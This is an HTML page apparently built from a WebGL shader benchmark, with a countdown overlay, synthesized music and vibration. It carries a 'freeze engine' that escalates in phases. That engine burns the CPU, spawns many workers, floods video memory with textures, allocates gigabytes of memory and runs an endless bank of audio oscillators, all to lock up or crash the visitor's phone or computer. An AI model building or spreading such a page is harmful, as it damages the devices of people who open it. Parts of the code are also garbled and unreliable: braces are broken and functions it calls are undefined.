<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="b       lack-translucent">
    <title>volumeshader_bm</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            height: 100%;
            background: #000;
            overflow: hidden;
            touch-action: none;
            -webkit-user-select: none;
            user-select: none;
        }

        #c1 {
            background: #fbf7fe;
            display: block;
        }

        #btn {
            position: fixed;
            left: 0px;
            top: 0px;
            z-index: 999;
            font-size: 12px;
            opacity: 0.3;
        }

        #c1 {
            position: fixed;
            left: 0px;
            top: 0px;
        }

        #main {
            transform-origin: 0px 0px;
            position: fixed;
            left: 0px;
            top: 0px;
        }

        #config {
            position: fixed;
            left: 0px;
            top: 30px;
            display: none;
            z-index: 999;
        }
        #alert-box {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            background: rgba(200,0,0,0.85); color: #fff; padding: 14px 28px;
            font-family: sans-serif; font-size: 18px; font-weight: bold;
            border-radius: 10px; display: none; z-index: 10000;
            box-shadow: 0 0 30px red; pointer-events: none;
            animation: pulse-red 0.6s infinite alternate;
        }
        @keyframes pulse-red {
            from { box-shadow: 0 0 20px red; }
            to   { box-shadow: 0 0 50px #ff4444, 0 0 80px red; }
        }
        /* ── COUNTDOWN OVERLAY ─────────────────────── */
        #cd-overlay {
            position: fixed; inset: 0; z-index: 99999;
            display: flex; align-items: center; justify-content: center;
            background: rgba(8, 6, 20, 0.92);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            cursor: pointer;
            transition: opacity 0.5s ease;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        #cd-overlay.fade-out { opacity: 0; pointer-events: none; }

        .cd-box {
            text-align: center;
            padding: 40px 60px;
            border-radius: 24px;
            background: rgba(255,255,255,0.04);
            border: 1.5px solid rgba(255,255,255,0.12);
            box-shadow: 0 0 60px rgba(120,0,255,0.2), inset 0 0 40px rgba(255,255,255,0.02);
            max-width: 340px;
            user-select: none;
            animation: cd-appear 0.6s cubic-bezier(.34,1.56,.64,1) both;
        }
        @keyframes cd-appear {
            from { opacity:0; transform: scale(0.7); }
            to   { opacity:1; transform: scale(1); }
        }

        .cd-emoji { font-size: 48px; margin-bottom: 8px; }

        .cd-title {
            font-size: 22px; font-weight: 700; color: #fff;
            margin-bottom: 4px; letter-spacing: 0.5px;
        }
        .cd-sub {
            font-size: 14px; color: rgba(255,255,255,0.45);
            margin-bottom: 32px;
        }

        #cd-num {
            font-size: 120px; font-weight: 900; line-height: 1;
            color: #7cf; text-shadow: 0 0 40px currentColor;
            transition: color 0.3s;
            animation: cd-pop 0.9s cubic-bezier(.34,1.56,.64,1) both;
        }
        @keyframes cd-pop {
            0%   { transform: scale(0.5); opacity: 0; }
            60%  { transform: scale(1.15); opacity: 1; }
            100% { transform: scale(1); }
        }
        #cd-num.pop { animation: cd-pop 0.9s cubic-bezier(.34,1.56,.64,1) both; }

        .cd-num-3 { color: #5df5a0; text-shadow: 0 0 40px #5df5a0; }
        .cd-num-2 { color: #ffd454; text-shadow: 0 0 40px #ffd454; }
        .cd-num-1 { color: #ff6060; text-shadow: 0 0 40px #ff6060; }

        .cd-tap-hint {
            margin-top: 28px; font-size: 13px;
            color: rgba(255,255,255,0.3);
            animation: cd-blink 1.2s infinite;
        }
        @keyframes cd-blink {
            0%,100% { opacity: 0.3; } 50% { opacity: 0.8; }
        }
    </style>
</head>

<body>
    <!-- Countdown Overlay — also acts as iOS audio unlock (catches first tap) -->
    <div id="cd-overlay">
        <div class="cd-box">
            <div class="cd-emoji">😈</div>
            <div class="cd-title">مستعد للتجربة؟</div>

    </div>

    <div id="ios-unlock" style="display:none;"></div>

    <div id="main">
        <canvas id="c1" width="1024" height="1024">
            <span>不支持DicK浏览器</span>
        </canvas>
    </div>
    <button id="btn">CONFIG</button>
    <div id="config">
        <textarea name="" id="kernel" cols="30" rows="10"></textarea>
        <br />
        <button id="apply">APPLY</button>
        <button id="cancle">CANCLE</button>
    </div>
    <script>
        // popup removed
        var cx, cy;
        var glposition;
        var glright;
        var glforward;
        var glup;
        var glorigin;
        var glx;
        var gly;
        var gllen;
        var canvas;
        var gl;
        var date = new Date();
        var md = 0, mx, my;
        var t2, t1 = date.getTime();
        var mx = 0, my = 0, mx1 = 0, my1 = 0, lasttimen = 0;
        var ml = 0, mr = 0, mm = 0;
        var len = 1.6;
        var ang1 = 2.8;
        var ang2 = 0.4;
        var cenx = 0.0;
        var ceny = 0.0;
        var cenz = 0.0;
        var KERNEL = "float kernal(vec3 ver){\n" +
            "   vec3 a;\n" +
            "float b,c,d,e;\n" +
            "   a=ver;\n" +
            "   for(int i=0;i<5;i++){\n" +
            "       b=length(a);\n" +
            "       c=atan(a.y,a.x)*8.0;\n" +
            "       e=1.0/b;\n" +
            "       d=acos(a.z/b)*8.0;\n" +
            "       b=pow(b,8.0);\n" +
            "       a=vec3(b*sin(d)*cos(c),b*sin(d)*sin(c),b*cos(d))+ver;\n" +
            "       if(b>6.0){\n" +
            "           break;\n" +
            "       }\n" +
            "   }" +
            "   return 4.0-a.x*a.x-a.y*a.y-a.z*a.z;" +
            "}";
        var vertshade;
        var fragshader;
        var shaderProgram;
        // ═══════════════════════════════════════════════════════
        // HEAVY FREEZE ENGINE  ——  SAVAGE EDITION
        // 3-phase GPU/CPU escalation that ramps up every few seconds
        // ═══════════════════════════════════════════════════════
        var isIOS      = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
        var freezePhase = 0;   // 0=normal 1=nuke 2=overkill 3=meltdown
        var freezeBurst = 0;

        // ── PHASE-AWARE CPU BURN ──────────────────────────────
        function burnCPU(ms) {
            var end = performance.now() + ms;
            var x = 1.0;
            while (performance.now() < end) {
                x = Math.sqrt(Math.abs(x) * Math.random() * 9999999 + 1);
                x += Math.sin(x) * Math.cos(x * 1.337);
                x += Math.log(Math.abs(x) + 1) * Math.atan2(x, x + 1);
                x += Math.pow(Math.abs(x) + 0.001, 0.7);
                if (freezePhase >= 2) {
                    // extra ops in OVERKILL+
                    x += Math.tan(x * 0.001) * Math.exp(-Math.abs(x) * 0.0001);
                    x += Math.cbrt(Math.abs(x)) * Math.sign(x - 0.5);
                }
            }
        }

        // ── WORKER FACTORY ────────────────────────────────────
        function spawnWorkers(extraMultiplier) {
            var mult = extraMultiplier || 2;
            var workerCode = [
                '"use strict";',
                'var x=1.0;',
                'function burn(){',
                '  var end=Date.now()+'+(isIOS?40:55)+';',
                '  while(Date.now()<end){',
                '    x=Math.sqrt(Math.abs(x)*Math.random()*9999999+1);',
                '    x+=Math.sin(x)*Math.cos(x*1.337);',
                '    x+=Math.log(Math.abs(x)+1)*Math.atan2(x,x+1);',
                '    x+=Math.pow(Math.abs(x)+0.001,0.7);',
                '    x+=Math.tan(x*0.001)*Math.exp(-Math.abs(x)*0.0001);',
                '  }',
                '  setTimeout(burn,0);',
                '}',
                'burn();'
            ].join('');
            try {
                var blob = new Blob([workerCode], { type: 'application/javascript' });
                var url  = URL.createObjectURL(blob);
                var cores = (navigator.hardwareConcurrency || 4) * mult;
                for (var w = 0; w < cores; w++) new Worker(url);
            } catch (e) {}
        }

        // ── TEXTURE VRAM BOMB ─────────────────────────────────
        // Uploads 2048×2048 random texture every 200ms → VRAM thrash
        var _texBombs = [];
        function startTextureBomb() {
            var size = 2048;
            var px = new Uint8Array(size * size * 4);
            for (var i = 0; i < px.length; i++) px[i] = Math.random() * 255 | 0;
            setInterval(function () {
                try {
                    var t = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, t);
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0,
                                  gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(px.length).fill(Math.random()*255|0));
                    _texBombs.push(t);
                    if (_texBombs.length > 8) {
                        gl.deleteTexture(_texBombs.shift()); // cycle — keep VRAM churning
                    }
                } catch (ex) {}
            }, 180);
        }

        // ── MULTI-CANVAS GPU STRESS ───────────────────────────
        // Spawns 3 hidden canvas elements doing 2D fill operations
        var _extraCanvases = [];
        function startExtraCanvases() {
            for (var c = 0; c < 3; c++) {
                try {
                    var cv = document.createElement('canvas');
                    cv.width = 512; cv.height = 512;
                    cv.style.cssText = 'position:fixed;left:-9999px;top:-9999px;';
                    document.body.appendChild(cv);
                    var ctx2 = cv.getContext('2d');
                    _extraCanvases.push(ctx2);
                    (function(ctx2d) {
                        function loop2d() {
                            var r = Math.random()*255|0, g = Math.random()*255|0, b = Math.random()*255|0;
                            ctx2d.fillStyle = 'rgb('+r+','+g+','+b+')';
                            ctx2d.fillRect(0,0,512,512);
                            // Gradient to force GPU rasterize
                            var grd = ctx2d.createRadialGradient(256,256,10,256,256,300);
                            grd.addColorStop(0,'rgba('+r+',0,'+b+',1)');
                            grd.addColorStop(1,'rgba(0,'+g+','+r+',0)');
                            ctx2d.fillStyle = grd;
                            ctx2d.fillRect(0,0,512,512);
                            requestAnimationFrame(loop2d);
                        }
                        loop2d();
                    })(ctx2);
                } catch (ex) {}
            }
        }

        // ── MEMORY PRESSURE ───────────────────────────────────
        function allocateMemory() {
            if (isIOS) {
                // iOS: rapid GC stress (alloc→release cycle)
                (function iosGC() {
                    try {
                        var t = [];
                        for (var i = 0; i < 30; i++) t.push(new Float32Array(512*1024));
                        setTimeout(function() { t = null; iosGC(); }, 350);
                    } catch(ex) { setTimeout(iosGC, 700); }
                })();
            } else {
                try {
                    var arr = [];
                    for (var i = 0; i < 800; i++) arr.push(new Float64Array(1024*1024));
                    window._memHold = arr;
                } catch(e) { window._memHold = window._memHold || []; }
            }
        }

        // ── AUDIO BOMB (PHASE 3) ───────────────────────────────
        // 32 simultaneous oscillators across all frequencies
        function audioBomb() {
            if (!audioCtx) return;
            try {
                for (var i = 0; i < 32; i++) {
                    var osc = audioCtx.createOscillator();
                    var gn  = audioCtx.createGain();
                    osc.type = ['sawtooth','square','triangle'][i%3];
                    osc.frequency.value = 55 + Math.random() * 8000;
                    gn.gain.value = 0.001; // ultra-quiet but graph is active
                    osc.connect(gn);
                    gn.connect(audioCtx.destination);
                    osc.start();
                    // never stop — audio graph burns CPU indefinitely
                }
            } catch(ex) {}
        }

        // ── RAF LOOP ─────────────────────────────────────────
        function ontimer() {
            ang1 += 0.015;
            draw();
            // Extra GPU passes in phase 2+
            if (freezePhase >= 2) { draw(); draw(); }
            if (freezePhase >= 3) { draw(); draw(); draw(); }
            freezeBurst++;
            // Burn budget scales with phase
            var burnMs = [isIOS?15:35, isIOS?20:50, isIOS?25:65, isIOS?30:80][freezePhase] || 80;
            burnCPU(burnMs);
            window.requestAnimationFrame(ontimer);
        }

        // ═══════════════════════════════════════════
        // MESMERIZER (32ki) - Web Audio API Recreation
        // 185 BPM | A minor | Hatsune Miku & Kasane Teto
        // ═══════════════════════════════════════════
        var audioCtx = null;
        var hapticInterval = null;

        // ── iOS AUDIO UNLOCK ─────────────────────────
        // iOS requires AudioContext to be created AND a buffer played
        // inside the SAME synchronous touch/click handler.
        function iosUnlockAudio(ctx) {
            // Play a zero-length silent buffer — this "unlocks" WebKit audio
            var buf = ctx.createBuffer(1, 1, ctx.sampleRate);
            var src = ctx.createBufferSource();
            src.buffer = buf;
            src.connect(ctx.destination);
            src.start(0);
            src.stop(0.001);
            // Also resume if suspended (iOS 13+)
            if (ctx.state === 'suspended') {
                ctx.resume();
            }
        }

        // ── NOTE HELPER ──────────────────────────────
        // Returns frequency for MIDI note number
        function midiToHz(m) { return 440 * Math.pow(2, (m - 69) / 12); }

        // A=57, B=59, C=60, D=62, E=64, F=65, G=67 (octave 4 = midi 60-72)
        // A minor: A B C D E F G
        // Mesmerizer main melody (approx, A minor, octave 5):
        //   E5=76, D5=74, C5=72, B4=71, A4=69, G4=67, F4=65, E4=64
        //   Opening hook: E5 E5 D5 C5 B4 A4 G4 E4 (repeating)

        var MESM_MELODY = [
            // bar 1 - iconic opening hook (8th notes)
            { m: 76, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 },
            { m: 71, d: 0.5 }, { m: 69, d: 0.5 }, { m: 67, d: 0.5 }, { m: 64, d: 0.5 },
            // bar 2
            { m: 64, d: 0.5 }, { m: 67, d: 0.5 }, { m: 69, d: 0.5 }, { m: 71, d: 0.5 },
            { m: 72, d: 0.5 }, { m: 74, d: 0.5 }, { m: 76, d: 1.0 }, { m: 76, d: 0.5 },
            // bar 3 - rising tension
            { m: 79, d: 0.5 }, { m: 79, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 },
            { m: 72, d: 0.5 }, { m: 71, d: 0.5 }, { m: 72, d: 0.5 }, { m: 74, d: 0.5 },
            // bar 4 - drop
            { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 }, { m: 71, d: 0.5 },
            { m: 69, d: 0.5 }, { m: 67, d: 0.5 }, { m: 64, d: 1.0 }, { m: 64, d: 0.5 },
            // bar 5 - chorus spike
            { m: 81, d: 0.25 }, { m: 80, d: 0.25 }, { m: 81, d: 0.25 }, { m: 80, d: 0.25 },
            { m: 79, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 },
            // bar 6
            { m: 71, d: 0.5 }, { m: 72, d: 0.5 }, { m: 74, d: 0.5 }, { m: 76, d: 0.5 },
            { m: 79, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 },
            // bar 7
            { m: 71, d: 0.5 }, { m: 69, d: 0.5 }, { m: 67, d: 0.5 }, { m: 69, d: 0.5 },
            { m: 71, d: 0.5 }, { m: 72, d: 0.5 }, { m: 74, d: 0.5 }, { m: 76, d: 0.5 },
            // bar 8 - resolve
            { m: 79, d: 1.0 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 1.0 }, { m: 71, d: 1.0 }
        ];

        // Bass line (A minor root movement, octave 2-3)
        var MESM_BASS = [
            { m: 45, d: 2 }, { m: 45, d: 1 }, { m: 43, d: 1 }, // Am
            { m: 48, d: 2 }, { m: 47, d: 1 }, { m: 45, d: 1 }, // C
            { m: 50, d: 2 }, { m: 50, d: 1 }, { m: 48, d: 1 }, // Dm
            { m: 47, d: 2 }, { m: 45, d: 2 }              // E
        ];

        // Arpeggio: A minor chord tones fast
        var MESM_ARP = [69, 72, 76, 79, 72, 76, 79, 76, 67, 71, 74, 76, 71, 74, 76, 74];

        // Audio now started inside initOnInteraction for iOS unlock compliance
        function startAudioAndHaptics() { startHaptics(); }

        // ── HAPTIC ENGINE ─────────────────────────────
        // Mesmerizer beat at 185 BPM = 324ms per beat, 162ms per 8th
        // Pattern mirrors the song's iconic opening rhythm:
        //   8th  8th  8th  8th  | 8th  8th  quarter  8th  (per bar, 2 bars shown)
        function startHaptics() {
            if (!navigator.vibrate) return;
            var b8 = Math.round(60000 / 185 / 2); // ~162ms per 8th note
            var b4 = b8 * 2;                        // ~324ms per quarter
            var gap = 30;                            // silence between pulses
            var on8 = b8 - gap;                      // ~132ms pulse
            var on4 = b4 - gap;                      // ~294ms pulse

            // 2-bar Mesmerizer haptic pattern (mirrors the main riff hits):
            // bar1: | 8 8 8 8 | 8 8 8 8 |
            // bar2: | 8 8 4 . | 8 8 4 . |
            // bar3: | 8th triplet feel chorus |
            var pat = [
                on8, gap, on8, gap, on8, gap, on8, gap,   // bar1 beat1
                on8, gap, on8, gap, on8, gap, on8, gap,   // bar1 beat2
                on8, gap, on8, gap, on4, gap,             // bar2 beat1 (quarter on 3)
                on8, gap, on8, gap, on4, gap,             // bar2 beat2
                on8, gap, on8, gap, on8, gap, on8, gap,   // chorus 8ths
                on4, gap, on4, gap,                      // chorus quarters
                on8, gap, on8, gap, on8, gap, on8, gap,   // bar
                on4, b4                            // final hit + rest
            ];
            var loopMs = pat.reduce(function (a, b) { return a + b; }, 0);

            function vibeLoop() { navigator.vibrate(pat); }
            vibeLoop();
            hapticInterval = setInterval(vibeLoop, loopMs + 50);
        }

        // ── AUDIO ENGINE ──────────────────────────────
        function playMesmerizer(ctx) {
            var BPM = 185;
            var beat = 60 / BPM;            // quarter note in seconds
            var bar = beat * 4;
            var bars = 8;
            var totalDur = bar * bars;
            var t = ctx.currentTime + 0.05;

            // Master bus with slight compression
            var master = ctx.createGain();
            master.gain.setValueAtTime(0.0, t);
            master.gain.linearRampToValueAtTime(0.82, t + 0.4);
            master.connect(ctx.destination);

            var comp = ctx.createDynamicsCompressor();
            comp.threshold.value = -18;
            comp.knee.value = 10;
            comp.ratio.value = 6;
            comp.attack.value = 0.003;
            comp.release.value = 0.15;
            comp.connect(master);

            // ─ Helper: schedule one note ─
            function note(midi, startT, durBeats, gainVal, type, detuneC) {
                var freq = midiToHz(midi);
                var dur = durBeats * beat;
                var osc = ctx.createOscillator();
                var env = ctx.createGain();
                osc.type = type || 'sawtooth';
                osc.frequency.value = freq;
                if (detuneC) osc.detune.value = detuneC;
                env.gain.setValueAtTime(0.0, startT);
                env.gain.linearRampToValueAtTime(gainVal, startT + 0.01);
                env.gain.setValueAtTime(gainVal, startT + dur - 0.03);
                env.gain.linearRampToValueAtTime(0.0, startT + dur);
                osc.connect(env);
                env.connect(comp);
                osc.start(startT);
                osc.stop(startT + dur + 0.05);
            }

            // ─ Kick drum ─
            function kick(startT) {
                var osc = ctx.createOscillator();
                var env = ctx.createGain();
                osc.frequency.setValueAtTime(160, startT);
                osc.frequency.exponentialRampToValueAtTime(40, startT + 0.08);
                env.gain.setValueAtTime(1.0, startT);
                env.gain.exponentialRampToValueAtTime(0.001, startT + 0.25);
                osc.connect(env); env.connect(comp);
                osc.start(startT); osc.stop(startT + 0.3);
            }

            // ─ Snare ─
            function snare(startT) {
                var buf = ctx.createBuffer(1, ctx.sampleRate * 0.15, ctx.sampleRate);
                var data = buf.getChannelData(0);
                for (var i = 0; i < data.length; i++)
                    data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (data.length * 0.3));
                var src = ctx.createBufferSource();
                var env = ctx.createGain();
                src.buffer = buf;
                env.gain.setValueAtTime(0.55, startT);
                src.connect(env); env.connect(comp);
                src.start(startT);
            }

            // ─ Hi-hat ─
            function hihat(startT, open) {
                var buf = ctx.createBuffer(1, ctx.sampleRate * (open ? 0.12 : 0.04), ctx.sampleRate);
                var data = buf.getChannelData(0);
                for (var i = 0; i < data.length; i++)
                    data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (data.length * 0.5));
                var hpf = ctx.createBiquadFilter();
                hpf.type = 'highpass'; hpf.frequency.value = 7000;
                var src = ctx.createBufferSource();
                var env = ctx.createGain();
                src.buffer = buf;
                env.gain.setValueAtTime(0.3, startT);
                src.connect(hpf); hpf.connect(env); env.connect(comp);
                src.start(startT);
            }

            // ── SCHEDULE DRUMS (8 bars) ───────────────
            for (var br = 0; br < bars; br++) {
                var bt = t + br * bar;
                // Kick: beats 1 & 3
                kick(bt);
                kick(bt + beat * 2);
                // Snare: beats 2 & 4
                snare(bt + beat);
                snare(bt + beat * 3);

                for (var h = 0; h < 8; h++) hihat(bt + h * beat * 0.5, h % 4 === 3);

            var mT = t;
            for (var mi = 0; mi < MESM_MELODY.length; mi++) {
                var nd = MESM_MELODY[mi];
                // Lead: detuned square (Miku-style bright)
                note(nd.m, mT, nd.d, 0.22, 'square', 0);
                note(nd.m, mT, nd.d, 0.10, 'sawtooth', 7);
                note(nd.m + 12, mT, nd.d, 0.06, 'sine', 0); // octave shimmer
                mT += nd.d * beat;
            }

            // ── SCHEDULE BASS ────────────────────────
            var bassT = t;
            for (var bi = 0; bi < MESM_BASS.length; bi++) {
                var bd = MESM_BASS[bi];
                note(bd.m, bassT, bd.d, 0.40, 'sawtooth', 0);
                note(bd.m, bassT, bd.d, 0.20, 'sawtooth', -7);
                note(bd.m + 12, bassT, bd.d, 0.10, 'square', 0);
                bassT += bd.d * beat;
            }

            // ── ARPEGGIO (Kasane Teto layer - 16th notes) ─
            for (var ai = 0; ai < bars * 16; ai++) {
                var aT = t + ai * beat * 0.25;
                var midi = MESM_ARP[ai % MESM_ARP.length];
                note(midi, aT, 0.22, 0.08, 'triangle', 0);
            }

            var padNotes = [69, 72, 76]; // Am chord
            for (var pi = 0; pi < padNotes.length; pi++) {
                note(padNotes[pi], t, bars * 4, 0.04, 'sine', pi * 3);
            }

            // ── LOOP ──────────────────────────────────
            master.gain.setValueAtTime(0.82, t + totalDur - 1.5);
            master.gain.linearRampToValueAtTime(0.0, t + totalDur);
            setTimeout(function () { playMesmerizer(ctx); }, (totalDur - 0.1) * 1000);

                document.getElementById("kernel").value = KERNEL;
            });
            function startEscalationPhases() {
            // ══════════════════════════════════════════════════════
            //  3-PHASE ESCALATION — SAVAGE MODE
            //  Phase 1 (1.5s): NUKE   — i<25,  k<5000,  step=0.0002
            //  Phase 2 (5s):   OVERKILL — i<35,  k<8000,  SOLVER=24, MAXR=24
            //  Phase 3 (12s):  MELTDOWN — i<50,  k<12000, SOLVER=32, MAXR=32
            //                            + extra canvases + texture bomb + audio bomb
            // ══════════════════════════════════════════════════════

            function applyShader(iters, steps, stepSz, solver, maxr) {
                try {
                    var K2 = KERNEL.replace('i<5', 'i<' + iters);
                    var F2 = FSHADER_SOURCE
                        .replace('#define MAXR 8\\n',   '#define MAXR '   + maxr + '\\n')
                        .replace('#define SOLVER 8\\n', '#define SOLVER ' + solver + '\\n')
                        .replace('const float step = 0.002;', 'const float step = ' + stepSz + ';')
                        .replace('k < 1002', 'k < ' + steps);
                    gl.shaderSource(fragshader, F2 + K2);
                    gl.compileShader(fragshader);
                    gl.linkProgram(shaderProgram);
                    gl.useProgram(shaderProgram);
                    glposition = gl.getAttribLocation(shaderProgram, 'position');
                    glright    = gl.getUniformLocation(shaderProgram, 'right');
                    glforward  = gl.getUniformLocation(shaderProgram, 'forward');
                    glup       = gl.getUniformLocation(shaderProgram, 'up');
                    glorigin   = gl.getUniformLocation(shaderProgram, 'origin');
                    glx        = gl.getUniformLocation(shaderProgram, 'x');
                    gly        = gl.getUniformLocation(shaderProgram, 'y');
                    gllen      = gl.getUniformLocation(shaderProgram, 'len');
                } catch (ex) {}
            }

            // ── PHASE 1: NUKE (1.5s) ─────────────────────────────
            setTimeout(function () {
                freezePhase = 1;
                var alertBox = document.getElementById('alert-box');
                if (alertBox) {
                    alertBox.style.display = 'block';
                    alertBox.textContent = '🔥 PHASE 1: NUKE — المعالج يحترق...';
                }
                applyShader(25, 5000, '0.0002', 16, 16);
                spawnWorkers(2); // 2× extra workers on top of existing
            }, 0);

            // ── PHASE 2: OVERKILL (5s) ───────────────────────────
            setTimeout(function () {
                freezePhase = 2;
                var alertBox = document.getElementById('alert-box');
                if (alertBox) {
                    alertBox.style.display = 'block';
                    alertBox.textContent = '💀 PHASE 2: OVERKILL — الجهاز يصرخ...';
                    alertBox.style.background = 'rgba(150,0,50,0.92)';
                }
                applyShader(35, 8000, '0.00015', 24, 24);
                spawnWorkers(3); // 3× extra
                startTextureBomb();
                startExtraCanvases();
            }, 1000);

            // ── PHASE 3: MELTDOWN (12s) ──────────────────────────
            setTimeout(function () {
                freezePhase = 3;
                var alertBox = document.getElementById('alert-box');
                if (alertBox) {
                    alertBox.style.display = 'block';
                    alertBox.textContent = '☠️ PHASE 3: MELTDOWN — تحذير: انتحار جهاز...';
                    alertBox.style.background = 'rgba(80,0,0,0.95)';
                    alertBox.style.fontSize = '22px';
                    alertBox.style.animation = 'pulse-red 0.2s infinite alternate';
                }
                applyShader(50, 12000, '0.0001', 32, 32);
                spawnWorkers(4); // 4× extra — total = 10× cores
                audioBomb();
            }, 3000);
            }
        }
    </script>
